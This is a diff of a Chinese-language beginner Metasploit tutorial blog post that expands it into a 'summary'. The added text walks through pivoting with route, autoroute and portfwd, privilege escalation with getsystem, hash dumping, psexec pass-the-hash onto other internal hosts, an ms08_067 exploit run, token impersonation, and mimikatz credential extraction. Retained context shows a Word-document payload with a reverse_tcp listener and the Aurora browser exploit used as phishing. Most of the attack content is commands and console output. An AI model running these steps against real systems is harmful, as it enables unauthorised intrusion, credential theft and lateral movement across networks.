@@ -4,7 +4,7 @@
 
 <head>
   
-  <title>metasploit小白教程一 - pgg学长</title>
+  <title>metasploit小白教程总结 - pgg学长</title>
   <meta charset="UTF-8">
   <meta name="description" content="针对于渗透测试期间遇到的各种坑的解决方法，与一些漏洞的复现教程而搭建的博客。">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
@@ -20,7 +20,7 @@
   <link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/pgg.png" type="image/png" />
   <meta name="description" content="msf小白学习教程一">
 <meta property="og:type" content="article">
-<meta property="og:title" content="metasploit小白教程一">
+<meta property="og:title" content="metasploit小白教程总结">
 <meta property="og:url" content="http://example.com/2020/12/23/Metasploit/index.html">
 <meta property="og:site_name" content="pgg学长">
 <meta property="og:description" content="msf小白学习教程一">
@@ -39,14 +39,14 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/024.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/025.png">
 <meta property="article:published_time" content="2020-12-23T07:46:25.000Z">
-<meta property="article:modified_time" content="2020-12-23T03:20:24.090Z">
+<meta property="article:modified_time" content="2020-12-30T03:04:31.675Z">
 <meta property="article:author" content="zh-CN">
 <meta property="article:tag" content="pgg学长">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/013.png">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/combine/npm/highlight.js@9.15.8/styles/atom-one-dark.css,gh/nexmoe/nexmoe.github.io@latest/lib/mdui_043tiny/css/mdui.css,gh/nexmoe/nexmoe.github.io@latest/lib/iconfont/iconfont.css,gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css?v=233" crossorigin>
   
-  <link rel="stylesheet" href="/css/style.css?v=1608693630485">
+  <link rel="stylesheet" href="/css/style.css?v=1609298466933">
 <meta name="generator" content="Hexo 5.2.0"></head>
 
 <body class="mdui-drawer-body-left">
@@ -164,15 +164,15 @@
         <div class="nexmoe-post">
   
       <div class="nexmoe-post-cover" style="padding-bottom: NaN%;"> 
-          <img data-src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/026.png" data-sizes="auto" alt="metasploit小白教程一" class="lazyload">
-          <h1>metasploit小白教程一</h1>
+          <img data-src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/026.png" data-sizes="auto" alt="metasploit小白教程总结" class="lazyload">
+          <h1>metasploit小白教程总结</h1>
       </div>
   
   
   <div class="nexmoe-post-meta nexmoe-rainbow" style="margin:10px 0!important;">
     <a><i class="nexmoefont icon-calendar-fill"></i>2020年12月23日</a>
-    <a><i class="nexmoefont icon-areachart"></i>2,651 字</a>
-    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 11 分钟</a>
+    <a><i class="nexmoefont icon-areachart"></i>5,116 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 21 分钟</a>
 </div>
 
   <div class="nexmoe-post-right">
@@ -180,7 +180,7 @@
       <div class="nexmoe-fixed">
         <div class="nexmoe-valign">
             <div class="nexmoe-toc">
-                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#msf%E5%B0%8F%E7%99%BD%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%E4%B8%80"><span class="toc-number">1.</span> <span class="toc-text">msf小白学习教程一</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-msf%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">1.0.1.</span> <span class="toc-text">1.msf是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-msf%E7%9A%84%E8%AF%A6%E7%BB%86%E5%88%86%E8%A7%A3"><span class="toc-number">1.0.2.</span> <span class="toc-text">2.msf的详细分解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97"><span class="toc-number">1.0.2.1.</span> <span class="toc-text">2.1搜索模块</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-1-1-%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97%E5%91%BD%E4%BB%A4%EF%BC%9Asearch"><span class="toc-number">1.0.2.1.1.</span> <span class="toc-text">2.1.1 搜索模块命令：search</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-1-2-help"><span class="toc-number">1.0.2.1.2.</span> <span class="toc-text">2.1.2 help</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-msf%E4%B8%8Emeterpreter%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8"><span class="toc-number">1.0.2.2.</span> <span class="toc-text">2.2 msf与meterpreter命令大全</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-2-1-msf%E5%91%BD%E4%BB%A4"><span class="toc-number">1.0.2.2.1.</span> <span class="toc-text">2.2.1 msf命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-2-2-meterpreter%E5%91%BD%E4%BB%A4"><span class="toc-number">1.0.2.2.2.</span> <span class="toc-text">2.2.2 meterpreter命令</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-msf%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E6%95%99%E7%A8%8B"><span class="toc-number">1.0.2.3.</span> <span class="toc-text">2.3 msf生成木马教程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-1-%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%91%BD%E4%BB%A4%EF%BC%9Amsfvenom"><span class="toc-number">1.0.2.3.1.</span> <span class="toc-text">2.3.1 生成木马命令：msfvenom</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-2-%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.0.2.3.2.</span> <span class="toc-text">2.3.2 生成木马语句</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-%E9%93%BE%E6%8E%A5%E9%92%93%E9%B1%BC"><span class="toc-number">1.0.2.4.</span> <span class="toc-text">2.4 链接钓鱼</span></a></li></ol></li></ol></li></ol></li></ol>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#msf%E5%B0%8F%E7%99%BD%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%E4%B8%80"><span class="toc-number">1.</span> <span class="toc-text">msf小白学习教程一</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-msf%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">1.0.1.</span> <span class="toc-text">1.msf是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-msf%E7%9A%84%E8%AF%A6%E7%BB%86%E5%88%86%E8%A7%A3"><span class="toc-number">1.0.2.</span> <span class="toc-text">2.msf的详细分解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97"><span class="toc-number">1.0.2.1.</span> <span class="toc-text">2.1搜索模块</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-1-1-%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97%E5%91%BD%E4%BB%A4%EF%BC%9Asearch"><span class="toc-number">1.0.2.1.1.</span> <span class="toc-text">2.1.1 搜索模块命令：search</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-1-2-help"><span class="toc-number">1.0.2.1.2.</span> <span class="toc-text">2.1.2 help</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-msf%E4%B8%8Emeterpreter%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8"><span class="toc-number">1.0.2.2.</span> <span class="toc-text">2.2 msf与meterpreter命令大全</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-2-1-msf%E5%91%BD%E4%BB%A4"><span class="toc-number">1.0.2.2.1.</span> <span class="toc-text">2.2.1 msf命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-2-2-meterpreter%E5%91%BD%E4%BB%A4"><span class="toc-number">1.0.2.2.2.</span> <span class="toc-text">2.2.2 meterpreter命令</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-msf%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E6%95%99%E7%A8%8B"><span class="toc-number">1.0.2.3.</span> <span class="toc-text">2.3 msf生成木马教程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-1-%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%91%BD%E4%BB%A4%EF%BC%9Amsfvenom"><span class="toc-number">1.0.2.3.1.</span> <span class="toc-text">2.3.1 生成木马命令：msfvenom</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-2-%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.0.2.3.2.</span> <span class="toc-text">2.3.2 生成木马语句</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-%E9%93%BE%E6%8E%A5%E9%92%93%E9%B1%BC"><span class="toc-number">1.0.2.4.</span> <span class="toc-text">2.4 链接钓鱼</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-5-1-route%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1"><span class="toc-number">1.0.2.4.1.</span> <span class="toc-text">2.5.1 route添加路由</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-5-2-autoroute-%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1"><span class="toc-number">1.0.2.4.2.</span> <span class="toc-text">2.5.2 autoroute 添加路由</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-5-3-portfwd-%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1"><span class="toc-number">1.0.2.4.3.</span> <span class="toc-text">2.5.3 portfwd 添加路由</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-6-%E9%9A%90%E8%BA%AB%E4%BB%A4%E7%89%8C%E6%94%BB%E5%87%BB"><span class="toc-number">1.0.2.5.</span> <span class="toc-text">2.6 隐身令牌攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-7-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.0.2.6.</span> <span class="toc-text">2.7 密码破解</span></a></li></ol></li></ol></li></ol></li></ol>
             </div>
         </div>
       </div>
@@ -257,8 +257,161 @@
 <p>然后我们拷贝第二部分，贴到word文档的正文里面，然后保存关闭<br><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/025.png"><br>然后在Kali上启动侦听<br>use exploit/multi/handler<br>set PAYLOAD windows/meterpreter/reverse_tcp<br>set LHOST 192.168.171.129<br>exploit<br>当在Windows启动刚刚的word时，我们就取得shell了</p>
 <h4 id="2-4-链接钓鱼"><a href="#2-4-链接钓鱼" class="headerlink" title="2.4 链接钓鱼"></a>2.4 链接钓鱼</h4><p>运行命令：<code>use exploit/windows/browser/ms10_002_aurora</code><br>接着添加：<code>set URIPATH /</code><br>加上payload:<code>set PAYLOAD windows/meterpreter/reverse_tcp </code><br>运行：<code>exploit -j</code><br>当目标访问我们的恶意URL时，我们就得到了shell</p>
 <hr>
+<p>####<center>2.5 内网穿透</center></p>
+<p>内网穿透不知道我理解的有没有毛病，就相当于在目标系统添加路由，然后转发出去，这边我只接受使用msf方法操作，可能感觉有点怪怪的，但是懂得都懂，好兄弟。</p>
+<h5 id="2-5-1-route添加路由"><a href="#2-5-1-route添加路由" class="headerlink" title="2.5.1 route添加路由"></a>2.5.1 route添加路由</h5><p>命令详细：</p>
+<ol>
+<li>add - 制作新路线</li>
+<li>remove - 删除路线; ‘del’是一个别名</li>
+<li>flush - 删除所有路线</li>
+<li>get - 显示给定目标的路线</li>
+<li>print - 显示所有活动路线</li>
+</ol>
+<p>#<del>这边和大家讲下，此方法是获取到了meterpreter后的操作，不过也对，没有获取也不会做到这一步，我真是废话了。</del></p>
+<p>例子：<br>通过session 1为从192.168.0.0到192.168.0.0的所有主机添加路由<br><code>route add 192.168.0.0 255.255.255.0 1</code><br><code>route add 192.168.0.0/24 1</code></p>
+<p>删除上述路线<br><code>route remove 192.168.0.0/24 1</code><br><code>route del 192.168.0.0 255.255.255.0 1</code></p>
 <hr>
-<p><em><strong><em>当然，文章还没有写完，请继续查看第二部分的教程</em></strong></em></p>
+<p>显示将用于给定主机或网络的路线<br><code>route get 192.168.0.11</code></p>
+<h5 id="2-5-2-autoroute-添加路由"><a href="#2-5-2-autoroute-添加路由" class="headerlink" title="2.5.2 autoroute 添加路由"></a>2.5.2 autoroute 添加路由</h5><p>命令说明：</p>
+<ol>
+<li><code>run autoroute -s 10.1.1.0 -n 255.255.255.0#将路由添加到10.10.10.1/255.255.255.0</code></li>
+<li><code>run autoroute -s 10.10.10.1#网络掩码默认为255.255.0</code></li>
+<li><code>run autoroute -s 10.10.1/24#CIDR表示法也可以</code></li>
+<li><code>run autoroute -p#打印活动路由表</code></li>
+<li><code>run autoroute -d -s 10.10.10.1#删除10.10.1/255.255.0路由</code></li>
+<li><code>使用“route”和“ipconfig”metermeter命令了解可用路由</code></li>
+</ol>
+<hr>
+<hr>
+<p><code>run autorpute -s 10.1.13.0/24</code> 绑定路由</p>
+<hr>
+<p><code>run autoroute -p</code> 查看</p>
+<hr>
+<p><strong>_现在开始举一个例子，假如现在测试一个公司系统，拿到了一台主机的权限，查看它的ip段发现，除了它本身的段，还存在<code>10.1.13.0/24</code>的段，那么首先添加10.1.13.0/24的路由，<code>run autoroute -s 10.1.13.0/24</code>,然后我们还得提权到system，然后转储密码散列，退出meterpreter,<code>background</code></strong></p>
+<p>meterpdreter &gt; <code>getsystem</code><br>….xxxx system<br>meterpreter &gt; <code>run hashdump</code><br>*<br>*<br>administrator:dwadwadwadwadwadwadawd<br>guest:Dwadwadwad</p>
+<hr>
+<p><strong><em><em>虽然我们添加了它第二个ip段的路由，但是还是不知道它第二个ip段有没有存活主机，现在用msf扫描一下，这里用基本的tcp端口扫描程序来查找端口139和445</em></em></strong></p>
+<hr>
+<ol>
+<li>msf:&gt;<code>use auxiliary/scanner/portscan/tcp</code>#进入扫描模块</li>
+<li>msf auxiliary(tcp)&gt; <code>set rhosts 10.1.13.0/24</code></li>
+<li>msf auxiliary(tcp)&gt;<code>set ports 139,445</code></li>
+<li>msf auxiliary(tcp)&gt;<code>set threads 50</code></li>
+<li>msf auxiliary(tcp)&gt;<code>run</code></li>
+</ol>
+<hr>
+<p>假设我们发现了一台额外的机器，我们尝试将我们收集的密码哈希与psexec漏洞利用模块一起使用，本地管理员密码在整个企业中通常是相同的。</p>
+<hr>
+<p>msf &gt; <code>use exploit/windows/smb/psexec</code></p>
+<p>msf exploit(psexec) &gt; <code>set rhost 10.1013.2</code></p>
+<p>msf exploit(psexec) &gt; <code>set smbuser Administrator</code></p>
+<p>msf exploit(psexec) &gt; <code>set smbpass xxxxxxxxxxxx</code></p>
+<p>msf exploit(psexec) &gt; <code>set payload windows/meterpreter/bind_tcp</code></p>
+<p>msf exploit(psexec) &gt; <code>exploit</code></p>
+<p>#<em><del>这边就显示了成功获取meterprter</del></em></p>
+<hr>
+<h5 id="2-5-3-portfwd-添加路由"><a href="#2-5-3-portfwd-添加路由" class="headerlink" title="2.5.3 portfwd 添加路由"></a>2.5.3 portfwd 添加路由</h5><p>命令说明：</p>
+<center>options:选项</center>
+1. -L :用于指定监听主机。除非需要在特定网络适配器上进行转发，否则可以省略此选项。如果未输入任何值，则将使用0.0.0.0.
+2. -h :显示以上信息
+3. -l :这是一个本地端口，它将在攻击机上监听，与此端口的连接将被转发到远程系统。
+4. -p :tcp连接将转发到的端口。
+5. -r :连接被中继到的ip地址（目标）。
+
+<hr>
+<center>Arguments:参数</center>
+1. Add: 该参数用于创建转发。
+2. Delete: 这将我们的转发端口列表中删除先前的条目。
+3. List: 这将列出当前转发的所有端口。
+4. Flush: 这将删除我们转发列表中的所有端口。
+<center>Syntax:语法</center>
+add > 
+在meteroreter shell中，以下列方式使用该命令：
+
+<hr>
+<p>meterpreter &gt; <code>portfwd add -l 3389 -p 3389 -r xxx.xx.xx.xx</code></p>
+<hr>
+<pre><code>• add会将端口转发添加到列表中，并将为我们创建一个隧道。请注意，此通道也将存在于Metasploit控制台之外，使其可用于任何终端会话。
+• -l 3389是本地端口，将被监听并转发到我们的目标。这可以是您的机器上的任何端口，只要它尚未被使用。
+• -p 3389是我们的定向主机上的目标端口。
+• -r [target host]是我们的目标系统的IP或主机名。</code></pre>
+<hr>
+<hr>
+<p>delete &gt;<br>与前面的命令非常相似，它是删除条目。再次从有效的Meterpreter会话中，我们输入以下内容：<br>meterpreter &gt; <code>portfwd delete –l 3389 –p 3389 –r [target host]</code></p>
+<hr>
+<hr>
+<p>🥶🥶🥶🥶🥶🥶🥶🥶🥶🥶🥶🥶🥶🥶🥶🥶🥶</p>
+<hr>
+<p>list &gt;<br>这个参数不需要任何选项，并为我们提供当前正在侦听和转发的端口的列表。<br>meterpreter &gt; <code>portfwd list</code></p>
+<hr>
+<p>🥳🥳🥳🥳🥳🥳🥳🥳🥳🥳🥳🥳😏🥳🥳🥳🥳</p>
+<hr>
+<p>flush &gt;<br>这个参数将允许我们一次性移除所有本地端口。<br>meterpreter &gt; <code>portfwd flush</code></p>
+<hr>
+<center>portfwd用法示例一：</center>
+在这个例子中，我们将在我们的本地机器上打开一个端口，并让我们的Meterpreter会话在同一端口上向我们的受害者转发连接。我们将使用端口3389，这是远程桌面连接的Windows默认端口
+
+<p>参与者ip： 172.16.194.141<br>受害者机器：172.16.194.144、192.168.1.191</p>
+<p>我们是通过192的入侵的，发现存在172的段，现在开始端口转发<br>meterpreter &gt; <code>portfwd add -l 3389 -p 3389 -r 172.16.194.141</code><br>查看端口监听：<code>netstat -antp</code></p>
+<hr>
+<p>🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡</p>
+<hr>
+<center>portfwd用法示例二</center>
+
+<p>假如目标机器存在ms08-067漏洞，我们可以使用之前相同的技术把正确的端口转发给所需的漏洞。<br>我们这边转发445端口，然后运行。</p>
+<p>msf exploit(ms08_067_netapi) &gt; show options<br>Module options (exploit/windows/smb/ms08_067_netapi):<br>Name     Current Setting  Required  Description</p>
+<hr>
+<p>   RHOST    127.0.0.1        yes       The target address<br>   RPORT    445              yes       Set the SMB service port<br>   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)<br>Payload options (windows/shell/reverse_tcp):<br>Name      Current Setting  Required  Description</p>
+<hr>
+<p>   EXITFUNC  thread           yes       Exit technique (accepted: seh, thread, process, none)<br>   LHOST     192.168.1.162    yes       The listen address<br>   LPORT     4444             yes       The listen port<br>Exploit target:<br>Id  Name</p>
+<hr>
+<p>   0   Automatic Targeting<br>msf exploit(ms08_067_netapi) &gt; exploit<br>🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡小丑竟然是我们自己🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡</p>
+<hr>
+<hr>
+<h4 id="2-6-隐身令牌攻击"><a href="#2-6-隐身令牌攻击" class="headerlink" title="2.6 隐身令牌攻击"></a><center>2.6 隐身令牌攻击</center></h4><p>meterpreter &gt; <code>list_tokens -u</code> 查看有没有有效的令牌</p>
+<p>假如说有个有效的administrator管理员令牌，我们现在模仿这个令牌以承担它的特权。发出impersonate_token命令时，请注意“SNEAKS.IN \ Administrator”中的两个反斜杠。这是必需的，因为它会导致只有一个斜杠的错误。还要注意，成功模拟令牌后，我们通过执行getuid命令来检查当前的用户ID </p>
+<p>meterpreter &gt; <code>impersonate_token SNEAKS.IN\\Administrator </code></p>
+<p>接下来，我们通过在Meterpreter中运行’ execute -f cmd.exe -i -t ‘来运行一个shell作为此个人帐户。“ execute -f cmd.exe ”告诉Metasploit执行cmd.exe，-i允许我们与受害者PC进行交互，而-t则认为我们刚刚通过隐身模式扮演角色。<br>meterpreter &gt; <code>execute -f cmd.exe -i -t </code><br>meterpreter &gt; <code>shell</code><br>C:\WINDOWS\system32&gt; <code>whoami</code><br>SNEAKS.IN\administrator</p>
+<h4 id="2-7-密码破解"><a href="#2-7-密码破解" class="headerlink" title="2.7 密码破解"></a><center>2.7 密码破解</center></h4><center>猕猴桃(mimikatz)</center>
+获取一个meterpreter，我们需要确保我们的会话以管理员级别的权限运行，以便mimikatz运行。
+meterpreter > `getuid`
+Server username: WINXP-E95CE571A1\Administrator
+meterpreter > `getsystem`
+...got system (via technique 1).
+meterpreter > `getuid`
+Server username: NT AUTHORITY\SYSTEM
+
+
+<hr>
+<p>Mimikatz支持32位和64位Windows体系结构。将我们的权限升级到SYSTEM后，我们需要使用sysinfo命令验证受感染机器的体系结构。这将与64位机器相关，因为我们可能在64位体系结构上损害了32位进程。如果出现这种情况，meterpreter会尝试将32位版本的Mimikatz加载到内存中，这会导致大多数功能无法使用。这可以通过查看正在运行的进程列表并在加载Mimikatz之前迁移到64位进程来避免。</p>
+<p>meterpreter &gt; <code>sysinfo</code><br><del>Computer        : WINXP-E95CE571A1<br>OS              : Windows XP (Build 2600, Service Pack 3).<br>Architecture    : x86<br>System Language : en_US<br>Meterpreter     : x86/win32</del></p>
+<p>看出这是一个32位机器，我们继续将mimikatz模块加载到内存中。<br>meterpreter &gt; <code>load mimikatz</code><br><del>Loading extension mimikatz…success.</del></p>
+<p>meterpreter &gt; <code>help mimikatz</code></p>
+<p><del>Command           Description<br>    ——-           ———–<br>    kerberos          尝试检索Kerberos凭证<br>    livessp           尝试检索livessp凭证<br>    mimikatz_command  运行自定义命令<br>    msv               尝试检索msv凭证（哈希）<br>    ssp               尝试检索ssp凭证<br>    tspkg             尝试检索tspkg凭证<br>    wdigest           尝试检索wdigest凭证</del></p>
+<p>Metasploit为我们提供了一些内置命令，可以直接从内存中展示Mimikatz最常用的功能，转储散列和明文凭证。但是，mimikatz_command选项使我们可以完全访问Mimikatz中的所有功能。</p>
+<p>meterpreter &gt; <code>mimikatz_command -f version</code></p>
+<p><del>mimikatz 1.0 x86 (RC) (Nov  7 2013 08:21:02)</del></p>
+<p>尽管有点不正统，但我们可以通过加载不存在的功能来获得可用模块的完整列表<br>meterpreter &gt; <code>mimikatz_command -f fu::</code></p>
+<p>~~Module : ‘fu’ introuvable</p>
+<p>Modules disponibles :<br>                - Standard<br>      crypto    - Cryptographie et certificats<br>        hash    - Hash<br>      system    - Gestion système<br>     process    - Manipulation des processus<br>      thread    - Manipulation des threads<br>     service    - Manipulation des services<br>   privilege    - Manipulation des privilèges<br>      handle    - Manipulation des handles<br> impersonate    - Manipulation tokens d’accès<br>     winmine    - Manipulation du démineur<br> minesweeper    - Manipulation du démineur 7<br>       nogpo    - Anti-gpo et patchs divers<br>     samdump    - Dump de SAM<br>      inject    - Injecteur de librairies<br>          ts    - Terminal Server<br>      divers    - Fonctions diverses n’ayant pas encore assez de corps pour avoir leurs propres module<br>    sekurlsa    - Dump des sessions courantes par providers LSASS<br>         efs    - Manipulations EFS~~</p>
+<p>要查询这些模块的可用选项，我们可以使用以下语法</p>
+<p>meterpreter &gt; <code>mimikatz_command -f divers::</code></p>
+<p>~~Module : ‘divers’ identifié, mais commande ‘’ introuvable</p>
+<p>Description du module : Fonctions diverses n’ayant pas encore assez de corps pour avoir leurs propres module<br>  noroutemon    - [experimental] Patch Juniper Network Connect pour ne plus superviser la table de routage<br>   eventdrop    - [super experimental] Patch l’observateur d’événements pour ne plus rien enregistrer<br>  cancelator    - Patch le bouton annuler de Windows XP et 2003 en console pour déverrouiller une session<br>     secrets    - Affiche les secrets utilisateur~~</p>
+<hr>
+<hr>
+<p>🧟‍♀️🧟‍♀️🧟‍♀️🧟‍♀️🧟‍♀️🧟‍♀️🧟‍♀️🧟‍♀️🧟‍♀️🧟‍♀️🧟‍♀️🧟‍♀️🧟‍♀️🧟‍♀️🧟‍♀️🧟‍♀️🧟‍♀️</p>
+<center>mimikatz 从内存中读取哈希和密码</center>
+
+<p><strong><em>我们既可以使用内置的Metasploit命令，也可以使用本机Mimikatz命令从受感染的机器中提取哈希和明文凭据。</em></strong></p>
+<hr>
+<p>内置metasploit<br>meterpreter &gt; <code>msv</code></p>
+<p>meterpreter &gt; <code>kerberos</code></p>
+<p>原生mimikatz</p>
+<p>meterpreter &gt; <code>mimikatz_command -f samdump::hashes</code></p>
+<p><strong><em><em>其实还有超级多的功能点，但是我感觉都差不多，需要的时候百度下，msf爆破ssh,等等等好多方式，这些懂的都懂，而且有些工具比这个方便，懂的都懂，hhhhhhhhh,再次感谢付杰表哥的文章，让我复习的方便很多。</em></em></strong></p>
+<p>####2020年度过的异常艰辛，愿世界和平。</p>
+<hr>
 <hr>
 <p>/##此教程仅供参考学习，请勿用于非法操作，请牢记网络安全法。</p>
 <hr>
@@ -311,7 +464,7 @@
 
 
 <script src="https://cdn.jsdelivr.net/gh/xtaodada/xtaodada.github.io@0.0.2/copy.js"></script>
- <script src="/js/app.js?v=1608693630486"></script>
+ <script src="/js/app.js?v=1609298466934"></script>
 
   
 
